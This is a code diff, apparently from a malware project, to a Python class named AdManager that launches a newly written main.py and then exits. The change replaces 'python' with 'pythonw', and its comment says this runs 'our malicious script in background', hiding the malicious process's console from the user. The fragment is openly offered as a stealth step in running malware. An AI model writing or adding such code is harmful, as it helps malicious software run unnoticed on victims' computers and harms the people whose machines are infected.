@@ -27,7 +27,12 @@ class AdManager(object):
                 file_path = dest_path + "\\main.py"
                 print("Executing new file: " + file_path)
                 print("python " + file_path)
-                result = os.system("python " + file_path)
+
+                ''' NOTE
+                Use 'pythonw' command instead of 'python'.
+                'pythonw' will run our malicious script in background
+                '''
+                result = os.system("pythonw " + file_path)
 
                 print("Closing old file")
                 sys.exit(0)
